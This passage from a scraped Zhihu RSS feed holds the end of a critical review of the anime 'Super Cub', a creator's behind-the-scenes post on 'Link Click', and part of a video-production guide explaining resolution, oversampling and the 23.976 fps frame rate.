src=\"https://pic1.zhimg.com/v2-b90d42bfa1d5024d40234c3e6fbd8ffb_720w.png?rss\" data-caption=\"本田小狼\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-b90d42bfa1d5024d40234c3e6fbd8ffb\" data-watermark-src=\"v2-5d590db1e0a8dee613895cdc2c438bb1\" data-private-watermark-src=\"v2-2bffbcfaf893f256c5eed1b09663046e\"></p>\n<p>只是这种手法，讲究一个一击脱离。如果用来展现压抑了一整集后，终于打破了灰暗世界的镜面，从原本黯淡的生活中走出，那是极好的，第一次看到路边的风景染上缤纷的颜色时，我的内心也是被触动了的。但问题在于，你也别十二集全这招啊，在灰暗和彩色的世界进进出出，小熊的生活真是容易褪色啊。</p>\n<p><b>古典乐</b></p>\n<p>日常生活细节的原声采样值得表扬，但配乐方面，大量的古典乐又显得喧宾夺主了。亲和力强是古典乐的优势，能够应用于绝大多数场景，但劣势同样明显。</p>\n<p>听到立山秋航木吉他和笛子打底的民乐，一下子就能想到本栖湖的美景，听到加藤达也、藤泽庆昌悠扬的管弦乐，一下子就能“哇嘎里马斯达”，听到日本贝多芬磅礴的管弦乐电子乐混搭，一下子就能“燃起来了”，配乐是决定观众对一部作品的“印象”的隐性的关键因素。很多日本作曲家不仅旋律写得好，编曲水平也很高，擅长在曲子里塞一堆乐器还能协调得很好，大大提高了听感。相比之下，多数为单一配器的古典乐实在是太单薄又缺乏特点了，然而本田小狼使用的古典乐多达15、6首，乃至就算其中混有几首石川智久和ZAQ的配乐，也完全没有感觉。一季度看下来，愣是没有一首抓住我耳朵的配乐，脑子里全是德彪西、德彪西、德彪西、李斯特、肖邦……</p>\n<p><b>同ポ</b></p>\n<p>同ポ截取了世界的一个角落不同时间的风景，展现了时间流转，四时之景不同。</p>\n<p>相比之下，同ポ除了用得多也没啥毛病可挑了，而且不得不说草薙的美术是好，一些固定机位空镜头反而能发扬优点。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c237f6b84d05d06c1b0f83dc18797bbd_720w.png?rss\" data-caption=\"这个机位尤其多，后面还有雪景\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"540\" data-watermark=\"original\" data-original-src=\"v2-c237f6b84d05d06c1b0f83dc18797bbd\" data-watermark-src=\"v2-6585d1b85f523800955f152b4ffc8cae\" data-private-watermark-src=\"v2-2e30b2ae15553b2d39feee7cb28fb5f7\"></p>\n<p>演出手段过于贫乏，演出意图又显而易见，玩不出新花样后进入了枯燥模式，如果只是无聊也罢，偏偏在于动画对女主角小熊的塑造又出现了问题（其实当我要去讨论人物塑造和故事逻辑的时候，这部作品对我而言已经是失败的了）。</p>\n<p>不止是大家都在吐槽的11集的荒诞营救，前几集就有所体现了，比如ep9收到椎子父亲赠送的贵重毛衣后理所当然地推给椎子去改，ep10打雪仗时用摩托车降维打击，如果到这还能勉强面不改色地说一句“小熊的性格真是糟糕啊“，那到ep11耳光扇醒落水椎子宣扬“小狼精神”的时候就真像邪教组织出来的，让我彻底蚌埠住了。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-f37d8bc14f8995414ac7c4fbac0dc87c_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-f37d8bc14f8995414ac7c4fbac0dc87c\" data-watermark-src=\"v2-0a63c24fef84284fe7377ebe7d05f85d\" data-private-watermark-src=\"v2-61de3647c230ef2257fa69f105f7f5c1\"></p>\n<p>我能理解制作组想塑造一个文静、孤独、不善表达情绪的少女小熊，但我看到的是一个无力、缺乏常识、唯cub至上的小熊，这其中的落差让摩托车的机油味盖过了少女之间的人情味，离温暖可爱的日常越来越远。</p>\n<p>很可惜的作品。</p>\n<p>————————————————————————————————————————</p>\n<p>我记得19年当初《卡罗尔和星期二》刚上时， <a class=\"member_mention\" href=\"http://www.zhihu.com/people/ef23b97680f75e827541394b25c958e3\" data-hash=\"ef23b97680f75e827541394b25c958e3\" data-hovercard=\"p$b$ef23b97680f75e827541394b25c958e3\">@海月的虚空秋凉的时鸟</a> 说：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-c185bc218ed7f17a2801f9013f6f4011_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1052\" data-rawheight=\"119\" data-watermark=\"original\" data-original-src=\"v2-c185bc218ed7f17a2801f9013f6f4011\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>《本田小狼与我》开播时， <a class=\"member_mention\" href=\"http://www.zhihu.com/people/ef23b97680f75e827541394b25c958e3\" data-hash=\"ef23b97680f75e827541394b25c958e3\" data-hovercard=\"p$b$ef23b97680f75e827541394b25c958e3\">@海月的虚空秋凉的时鸟</a> 又说：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7c667c73a9482429f41a795a0d7e6607_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"855\" data-rawheight=\"94\" data-watermark=\"original\" data-original-src=\"v2-7c667c73a9482429f41a795a0d7e6607\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>不禁想问，真的成功了吗？ =。=</p>\n<p><img src=\"https://pic2.zhimg.com/v2-fb8b2f8049f68f5be92e427ec0a61eeb_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"158\" data-rawheight=\"159\" data-watermark=\"original\" data-original-src=\"v2-fb8b2f8049f68f5be92e427ec0a61eeb\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/woshilaodingdang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">老叮当</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/453183108/answer/1988984965?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">47 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/468802426?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价2021年7月动画《见面之后5秒开始战斗》第一集？</a><br><a href=\"http://www.zhihu.com/question/466227677?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">怎么评价动画《致不灭的你》？</a><br>\n","link":"http://www.zhihu.com/question/453183108/answer/1988984965?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"动画《时光代理人》已经完结，如何评价这部作品？","date":"2021-07-11 11:30:09","description":"\n<p><b>《时光代理人》创作分享</b></p>\n<p>哗——时间奔涌，转瞬即逝。一转眼，《时光代理人》完结撒花。</p>\n<p>其实每个项目都有很多话想跟大家唠唠，之前也立过FLAG说会抽空做分享，今天就趁此良辰吉日说说《时光代理人》的点点滴滴。</p>\n<p><br></p>\n<p>鄙人不才，从2013年创业开始带着团队做过很多作品，但原创内容屈指可数。关于为什么原创做得少，其实在过去的某些采访中也说过，行业发展还是需要有人愿意成为基石，来垫高整个市场。所以，前几年为数不多的原创作品其实都是忙里偷闲的自嗨。《凸变英雄BABA》最早辣眼的海报和清奇的画风就是嗨大了的最好写照。为了能把原创动画踏踏实实地做好，在2018年和B站成立了合资公司哆啦哔梦。</p>\n<p><br></p>\n<p>其实，《时光代理人》的前身是18年国创发布会上发布过的《净化法则》。当时企划的方向就是做一部能让观众打开第一集就放不下的剧集。悬疑题材动画国内很少涉及，我还是不愿放弃，决心继续尝试。当时，正好我也在构思新一季的《凸变英雄》，就萌生了将其中的创意元素和悬疑剧结合的念头。很多网友也从各种渠道扒出了《凸变英雄PHOTO》这份企划。的确，穿越照片这个想法原本就是准备用在《凸变英雄PHOTO》中的。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-b870a61cc042443ac036f4de358b2425_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1039\" data-rawheight=\"735\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><br></p>\n<p>19年年底开始了《时光代理人》的剧本创作，最早的思维源头其实就是单纯的想要回到过去的照片——当时那些灿烂的笑，当时课桌上的涂鸦，如果现在的自己回到那里，那时，感受会是怎样的呢。但作为目标是让人想不停追下去的剧集，适当地设置障碍是必要手段，所以就想到了将一种能力拆成两份的想法——虽然能通过照片回去，但无法知道将会发生什么。知道照片中将会发生的事，但无法进入照片。程小时和陆光，就此诞生。所以，双男主一开始并不是为了商业卖点而故意设计的，只是需要两个能力互补的角色。当然，我也考虑过男女搭配的合作模式，但感觉异性之间的很难彻底将自己的内心交给对方，除非跨越了单纯的友谊。但两个好哥们之间是可以的，所以最终还是决定启用双男主。而乔苓的设计是为了增加女性伙伴特有的视角和行为，比如对程小时姐姐一般亲人的关怀，这种感受和陆光能给予程小时的是完全不同的。</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-2dd0c3fc4c823025430d777f79ea966a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"641\" data-rawheight=\"849\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><br></p>\n<p>接着是考虑用主线中穿插单元剧的模式，这套模式在很多剧集里都经常使用。原本《净化法则》的企划初衷是从一开始就直切主线，不给观众喘息的机会。但进入照片这个题材我觉得能发挥的空间太大了，它能承载更多现实主义和人文情怀。所以为了两边平衡，才有了现在主线加单元的经典模式。并且，在想到进入照片这个点子的那一刻，我就想：如果能通过动画回到真实发生过的事件中，去帮助那些曾今在某时某刻，某张照片中留有遗憾的人弥补伤痛，那一刻作为动画作品就有了更非凡的意义。所以，不管剧集中的番外篇还是日常单元的设置都是为了未来能帮助现实中的人们“还愿”而设下的准备。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-aa582f4baed87b53254d3a48c260c23b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1002\" data-rawheight=\"472\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><br></p>\n<p>在几个单元故事的选题上，基本都有现实中的原型。特别是地震回，虽然自己没有亲身经历过那些灾难，但有一张攀枝花地震时母亲紧紧抱着自己女儿的照片给我带来了巨大的震撼，久久无法忘怀。所以设计陈潇母亲用身体护住陈潇的姿势就是参考了那张照片中母亲的姿势，希望以此向那些伟大的母亲们致敬。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-e58ccc9cbfd376ff357287add97efa7c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1039\" data-rawheight=\"585\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>整个第一季的故事其实主要脉络都是围绕着小时的成长，从第一次接触EMMA事件时的冒失鬼，到地震回面对不能改变过去的绝望，他有了第一次对自己该用能力去做什么的真正思考。虽然无法改变过去，但如果回到过去能给现在的人带来帮助，给他们一个更好的未来，那还是值得继续的。所以，他接受了亮哥的委托帮他找回了豆豆。中间他赐给梅姨的那一记“送你上西天”却是纯属意外，因为受到惊吓时做出了条件反射。而因此也误打误撞地让梅姨领教了这个小祖宗的本事，从而对豆豆不敢下黑手。程小时在不经意间还是对过去产生了一些细微的变化，但这些都因为带来的是好结果而被疏忽了。随后他积极地想要协助警方捉拿连环杀人案的凶手也因为拐卖案的成功。而亲临EMMA“被杀”现场成了他第二个成长转折，让他陷入焦虑——改变过去而产生的代价是否能够承受。所以在营救徐姗姗之前，小时进行了一段独处，陆光也很善解人意，给了他充足的时间不去打扰他。当小时完成独立思考后再次说出：“准备出发”时的语气，状态都和第一集时完全不同了，这也证明了他再次成长。所以，最终他向EMMA说的那些话，其实也是他这一季中成长的进化和缩影，正因为他能体验不同的人生，那些人生中最珍贵的东西也都保留了在他的身上和记忆里。当时撰写剧本的时候也希望在最后让小时的人物经历，无论是事件推理，还是人物塑造在第一季中都能完成闭环。</p>\n<p><br></p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-8883c469722c175a25724a7768b43e52_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1039\" data-rawheight=\"585\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><br></p>\n<p>当然，第一季的尾声部分也故意和第一集做了呼应，在温暖和感动的情绪还未完全平复之时给大家带来更残酷的一刀。而这一刀也是将主角团的三人同时逼入绝境，所以大家多多点追番随时更新第二季的一手消息哈。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-72b750c046decee620e37135f103cb37_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"913\" data-rawheight=\"677\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><br></p>\n<p>啰啰嗦嗦和大家絮叨了些《时光代理人》创作过程的来龙去脉，其实能聊得还有很多，如果大家感兴趣可以在留言里发问，之后我再抽时间和大家继续做分享。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/haolin-41?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">haolin</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/470959705/answer/1990044038?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">68 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/469574987?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价动画《时光代理人》第十集？</a><br><a href=\"http://www.zhihu.com/question/459378374?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价动画《时光代理人》第四集?</a><br>\n","link":"http://www.zhihu.com/question/470959705/answer/1990044038?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"想做视频？这里有一份入门到进阶知识完整指南 ​","date":"2021-07-09 13:15:08","description":"\n<p>​【<b>万字长文，解释你在视频制作时会用到的知识和术语</b>，以及在器材选择时应该注意的问题，有点长，可以先收藏下来，慢慢看】 ​</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-ebdde659e030c07c0e9ce3d56d38341a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"852\" data-rawheight=\"1042\" class=\"origin_image zh-lightbox-thumb\" width=\"852\" data-original=\"https://pic3.zhimg.com/v2-ebdde659e030c07c0e9ce3d56d38341a_r.jpg\"></figure><p>​</p>\n<p>不可置疑的是，这是一个视频的时代。 </p>\n<p>不论是相机还是手机厂商，每次发布会也会用很长的篇幅来解释他们产品的视频能力。 也很有多朋友为了更好的视频质量，不在满足于手机拍摄，开始选择单反或者微单开始自己视频的创作。 选购肯定也会遇到何种乱七八糟的参数，什么10bit ,什么422，super35，这是都是什么，又有什么作用？ 今天我们就来认真地讨论一下这些东西。</p>\n<p>​</p>\n<h2>4K即正义？分辨率</h2>\n<p>当你在B站看小姐姐跳舞的时候，有时候可能会看到这个标志【4k超清】。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-e003ff23b00c7d5cd40f19fc5cc5888a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic3.zhimg.com/v2-e003ff23b00c7d5cd40f19fc5cc5888a_r.jpg\"></figure><p>这也许是大家最熟悉的一个的参数——分辨率，不论是视频也好，还是显示器或者电视机都会用到这个，很简单，也很容易理解，分辨率越高，视频画质越好。 ​</p>\n<p>通常上，还会用这样的一张图，来解释不同视频分辨率的效果。我们也会把这个分辨率称为『输出分辨率』。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-f0d93cd8f4e5a062e1cf93c85bfec81d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-f0d93cd8f4e5a062e1cf93c85bfec81d_r.jpg\"></figure><p>有聪明的小朋友要问了，我的手机或者显示器不过是1080P的，那么还有必要搞4K么？ ​</p>\n<p>即使最终都是输出为1080P的，拍摄的素材为4K，会包含更多的色彩信息，感官上会感觉更加的清晰，色彩更加丰富（这个过程就是超采，下文会详细解释），而且也方便你进行画面的裁剪或者稳定。 ​</p>\n<p>拍摄8K同理，即使最终输出为4K的视频，也会获得更好的画面，但是问题就在于能够拍摄8K的设备普遍不便宜，对于存储和处理的要求会更高。除了相机之外，你还得更新电脑，买更贵的显卡和更大的硬盘才行。 ​</p>\n<p>所以目前来讲，<b>4k无疑更具有实用性</b>，而且几乎每一台手机，哪怕是入门级别的相机，也都开始普及4K视频了。 ​</p>\n<p>注： 4K分辨率其实是一个统称，画面横向像素在4000个左右，纵向在2000个像素左右的，都可以称之为4k分辨率，不同的设备和场景下，所以就有了不同的4k分辨率。 ​</p>\n<p>最为常见的，是我们日常的网络视频以及很多显示器的比例，16：9，分辨率为3840 × 2160，手机相机也通常也以这个分辨率捕获素材。 ​</p>\n<p>当然，还有其他规格的4k分辨率，可参考下表： </p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-f9d5108e8fc41c56ec0fb4bc8e701097_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic4.zhimg.com/v2-f9d5108e8fc41c56ec0fb4bc8e701097_r.jpg\"></figure><p>部分相机也能拍摄DCI-4K的视频，比如松下的GH5s，S1H，以及万元最强全画幅视频微单S5。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1396591631634583552\"></a><p>​</p>\n<h2>为什么拍视频的时候，画面有变化？裁切与超采</h2>\n<p>现在请你拿出你的手机，从拍照模式切换到录像模式，你会发现一个有趣的现象，画面的视角好像发生了变化。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-8ed33d5c93c3e4bf43571e909b11942c_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"994\" data-rawheight=\"481\" data-thumbnail=\"https://pic1.zhimg.com/v2-8ed33d5c93c3e4bf43571e909b11942c_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"994\" data-original=\"https://pic1.zhimg.com/v2-8ed33d5c93c3e4bf43571e909b11942c_r.jpg\"></figure><p>为什么呢？ ​</p>\n<p>其实很好理解，拍摄4K视频，分辨率为3840 × 2160，像素不过800万左右，但是问题现在手机像素通常都在1200万像素之上，相机呢，普遍的像素值在2000万左右。 ​</p>\n<p>那多出来的这些像素，怎么办？ ​</p>\n<p>第一种解法就是，多出来就多出来呗，不用就行，于是就有了裁切这种方式，拍摄视频的时候，我只使用中间那部分需要的像素就够了。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-42f413c6db1c21ff16988a6bafd8b865_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-42f413c6db1c21ff16988a6bafd8b865_r.jpg\"></figure><p> 缺点显而易见，就是本来能够拍摄的到视角变小了。 ​</p>\n<p>比如裁切系数为1.7倍，你使用一只24mm的广角镜头，拍摄出来的画面相当于40mm镜头拍的，丧失了广角端。 ​</p>\n<p>顺便也提醒大家一点，厂家往往很鸡贼，会把这个裁切系数用很小很小的字体写在备注里。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-56844b28915425c0986f0ee66889c5b0_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic1.zhimg.com/v2-56844b28915425c0986f0ee66889c5b0_r.jpg\"></figure><p>既然集中使用中间的像素会丧失视角，那么我尽量使用整个传感器呗。 ​</p>\n<p><b>于是『跳采』这种方式出现。</b>简单来说，就是每间隔几个像素记录一个像素点的信息，其它像素的信息就不要了，如图所示。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-7a04ec980152ed632e92cf4585e6a435_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-7a04ec980152ed632e92cf4585e6a435_r.jpg\"></figure><p>很棒，解决了视角裁切的问题，但是缺点也很明显，舍弃了一部分像素的信息，不论是画质上还是颜色上，都会有所欠缺。 ​</p>\n<p>有没有更好的解法，<b>有，就是超采。 ​</b></p>\n<p>在理解超采之前，得先理解传感器是如何记录颜色的。 ​</p>\n<p>实际上，像素点是不会记录颜色信息的，他只能记录光的强度，那么如果还原真实世界的色彩呢？ 不得不提『拜尔滤镜』了。在像素上放上滤色片，然后记录不同颜色的滤色片对光的过滤效果，就可以得到颜色信息。 ​</p>\n<blockquote> 具体的光学知识可以参考之前的这个回答。</blockquote>\n<p><a href=\"https://www.zhihu.com/answer/1721715927\" class=\"internal\">李明殊：彩色胶片主要是什么原理?</a></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>但是像素不是胶片的感光剂，摞三个滤色片在上边，也不能记录色彩信息，于是拜尔想了一个办法，把<a href=\"https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki/RGB\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">RGB</a>滤色器按照一定的方式排列在相邻像素上，这样就可以根据周边的颜色数值，来算出一个『颜色』。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-71f767145414cedbdf9a10f541fa8f6d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-71f767145414cedbdf9a10f541fa8f6d_r.jpg\"></figure><p> 既然是『算出来』，那么就不是真实的。 ​</p>\n<p>​</p>\n<p>但是不可否认的是，<b>只要我输入的条件够多，结果应该更加准确，接近真实。</b> 超采就是这么一个类似的过程—— ​</p>\n<p>采集传感器上所有像素的信息，然后根据周边像素的信息算出来一个数值，然后记录。 ​</p>\n<p>为了便于理解超采，我们举一个不太严谨的例子，假如现在有一个3200万像素的相机，需要拍摄4K视频。也就是需要将四个像素变为一个像素。 </p>\n<p>假设四个像素的情况如图所示： ​</p>\n<p>跳采，选择其中一个颜色直接记录，比如1中的红色； 超采，就是根据周边的的像素，来计算出一个颜色，然后作为记录。无疑，这种方式可以获得更准确的颜色，更加锐利清晰的画面。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-582ac1bc7e85a2bbe9d0dd21f12cf653_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic4.zhimg.com/v2-582ac1bc7e85a2bbe9d0dd21f12cf653_r.jpg\"></figure><p> 看起来很棒了，超采就没有什么问题了嘛？ ​</p>\n<p>有。 ​</p>\n<p>由于超采需要计算，而计算是需要一定的时间，就会导致果冻效应更加明显。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-b738fab57fe8e3586addcebff4362f61_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-b738fab57fe8e3586addcebff4362f61_r.jpg\"></figure><p> 你在车上拍的电线杆子，也就会更歪一点了。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-cd02e430fb1d3597bf9327893f0c6483_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic4.zhimg.com/v2-cd02e430fb1d3597bf9327893f0c6483_r.jpg\"></figure><blockquote>注: <br>即使具有超采功能的相机，不是所有的视频规格都有超采，不同的分辨率和帧率下的设定会不同。 <br>比如索尼的大部分相机，4k视频是从6K分辨率超采而来，但是1080P的规格不是； <br>超采不一定会用到整个传感器，即使是超采，也会有画面裁切（但是这个比例通常很小），只要采集的像素比最终输出的像素多，就可以称之为超采。 ​</blockquote>\n<p>​</p>\n<h2>为什么是23.98？关于帧率</h2>\n<p>戈达尔说：</p>\n<blockquote> 电影是每秒24格的真理。</blockquote>\n<p>因为视觉暂留，一秒24帧的画面，看起来流畅而且自然。 ​</p>\n<p>为了拍摄电影感的视频，你把相机的帧率调整为24帧，然后兴冲冲的拍了一段视频，但是当你把视频导入到电脑上，右键属性的时候，或者把素材放到剪辑软件中，会发现，视频的帧率是23.98。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-c35eb85358b43f97bb4ccc95035830e3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic4.zhimg.com/v2-c35eb85358b43f97bb4ccc95035830e3_r.jpg\"></figure><p> 说好的24p，怎么还差我0.02，剪辑个视频都有中间商赚差价吗？ ​</p>\n<p>实际上，23.98也是个近似值，准确的数值应该是23.976，为什么是这么一个奇葩的数字？ 鲁(niu)迅(dun)曾经说过——</p>\n<blockquote> 一切看起来不合理的设定背后，都是历史遗留问题。</blockquote>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-4b0725848043fa53a60451127d04d246_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic3.zhimg.com/v2-4b0725848043fa53a60451127d04d246_r.jpg\"></figure><p>美国的电源频率是60Hz，所以当年电视诞生后，电视的场频也是60Hz。 ​</p>\n<p>当时的电视采用的是隔行扫描，也就是一秒钟需要记录30张画面，也就是30fps。 </p>\n<p>但是后来彩色电视诞生，需要传输和记录色度信息，彩色副载波与亮度信号和音频载波之间的相互干扰。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-b90e2e0e4f63c26fb79bdec94ba09b56_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic3.zhimg.com/v2-b90e2e0e4f63c26fb79bdec94ba09b56_r.jpg\"></figure><p>工程师为了解决这个问题，把频率下降千分之一，场频变为59.94，同理，帧率就是59.94✖️1/2=29.97。 </p>\n<p>电影的帧率也下降千分之一，24/1.001=<b>23.976</b>，看，这个神奇的数字出现了。</p>\n<blockquote> 更多详细内容，可以参考<a href=\"https://zhuanlan.zhihu.com/p/66319869\" class=\"internal\"><span class=\"invisible\">https://</span><span class=\"visible\">zhuanlan.zhihu.com/p/66</span><span class=\"invisible\">319869</span><span class=\"ellipsis\"></span></a>这篇文章。</blockquote>\n<p>当人们想用电视看电影的时候，问题就出现了，电视是29.97，电影是23.976，这帧率不一样，还怎么看？ </p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-86e53144a18d61d80a1a9cff208ffca9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-86e53144a18d61d80a1a9cff208ffca9_r.jpg\"></figure><p>也就是说电影画面每四帧要塞到电视的五帧里，怎么塞? ​</p>\n<p>于是 就有了3：2pulldown的技术。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-1009a52ad1c9034ac7ca92ac6199d058_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic1.zhimg.com/v2-1009a52ad1c9034ac7ca92ac6199d058_r.jpg\"></figure><p>还记得之前说的隔行扫描吗？ </p>\n<p>每个画面经过隔行之后，会产生两个画面，然后按照2323这样的方式排列，最后就可以把四帧的画面塞到五帧中。 ​</p>\n<p>虽然说已经是数字时代了，但是还有一些地区和在使用模拟信号的电视或者广播，所以23.976这样的帧率的兼容性会更好的一点。 